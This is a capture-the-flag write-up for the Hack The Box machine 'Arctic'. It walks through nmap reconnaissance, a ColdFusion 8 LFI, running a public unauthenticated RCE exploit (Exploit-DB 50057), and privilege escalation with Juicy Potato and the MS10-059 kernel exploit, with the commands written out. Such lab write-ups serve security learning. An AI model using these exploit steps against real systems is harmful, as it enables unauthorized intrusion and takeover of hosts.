# Arctic Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

### For this box I added the ``T5`` option to my scan because I knew that a common scan would not be enough.
### I also wanted to see the difference between T4 and T5 but it was minimal for me 

``nmap -sC -sV -oA arctic 10.10.10.11 -T5``

![image](https://user-images.githubusercontent.com/123066149/220932396-c5773103-b471-4d3c-b5e5-51a619a37150.png)

![image](https://user-images.githubusercontent.com/123066149/220932465-d8737908-3574-4299-b174-7ddb20ea4f36.png)


# ${{\color{purple}Initial Foothold}}\ $

### After a google search I realize that the FMTP protocol is an equivalent of a web server to store files :
### On this box it's on port 8500 :

![image](https://user-images.githubusercontent.com/123066149/220934868-d67af8f1-7bfd-42c2-94bd-8aed78e3953d.png)

### I go to the amin section :

![image](https://user-images.githubusercontent.com/123066149/220935241-2a89a9c0-525f-4bef-8e8e-e2ec52f89f6b.png)

### And now, we can see and Adobe coldfusion version 8 :

![image](https://user-images.githubusercontent.com/123066149/220935941-ebb041fa-b10f-4455-a9f6-c15d441be454.png)

### As we can see there is an lfi :

![image](https://user-images.githubusercontent.com/123066149/220937986-a4f79541-5760-446e-9d10-bbad6ea21e6a.png)

``hashid 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03``

![image](https://user-images.githubusercontent.com/123066149/220938321-30ea552b-5772-4418-850c-42c99d6cd362.png)

# ${{\color{purple}Exploitation}}\ $

### I did not go further on this track because there is an unauthanticated rce :

![image](https://user-images.githubusercontent.com/123066149/220939537-b8df9049-69c7-471a-9366-ca3e58c38b88.png)

https://www.exploit-db.com/exploits/50057

``searchsploit -x cfm/webapps/50057.py``

![image](https://user-images.githubusercontent.com/123066149/220940043-4ce2e9e8-b0cf-4a97-aded-a453f317cc17.png)

``python 50057.py``

### After a small change in the exploit it works very well :

![image](https://user-images.githubusercontent.com/123066149/220940636-5282db37-173a-4033-a2ee-bf3669fd159a.png)


![image](https://user-images.githubusercontent.com/123066149/220940523-d890d54c-7026-4500-9090-03f317893185.png)


# ${{\color{purple}Privilege Escalation}}\ $

### Here I used two methods because I had practiced a lot on the first one :

### THE FIRST :

``Juicy_Potato_x86.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -t * -p whoami``

![1](https://user-images.githubusercontent.com/123066149/220948663-46fef5e7-f029-4b8b-b5ad-29232a382ca4.PNG)

``Juicy_Potato_x86.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -t * -p C:\Users\tolis\Desktop\exploit.exe``

![image](https://user-images.githubusercontent.com/123066149/220949125-52a7f087-13c5-4030-b344-0b4b0fea7675.png)

### THE SECOND :

### No Hofix I will use a kernel exploit :

![image](https://user-images.githubusercontent.com/123066149/220949802-990f7813-a5da-4a64-874b-2a9fa392118a.png)

``python2.7 windows-exploit-suggester.py -i ../sysinfo.txt -d 2023-02-18-mssb.xls``

![image](https://user-images.githubusercontent.com/123066149/220950502-1d629eb2-411d-492d-875f-bba730e82827.png)

### After a redirection in a file and cleaning :

![image](https://user-images.githubusercontent.com/123066149/220951019-28ff53bb-d828-4d72-803b-7d32aecc4646.png)

### I used this resource for kernel exploit which is really very useful :

https://kakyouim.hatenablog.com/entry/2020/05/27/010807

### : This repo for the compiled exploit :

https://github.com/SecWiki/windows-kernel-exploits

### And these resources for kernel vulnerabilities on windows :

https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842


https://github.com/gladiatx0r/Powerless


https://github.com/rasta-mouse/Watson

#### And thanks to these resources I have exploited a vuln kernel very quickly (MS10-059) :

![image](https://user-images.githubusercontent.com/123066149/220956467-fa85a83a-268f-49f4-aba8-33917974a4f6.png)


# ${{\color{purple}Points of Improvement}}\ $
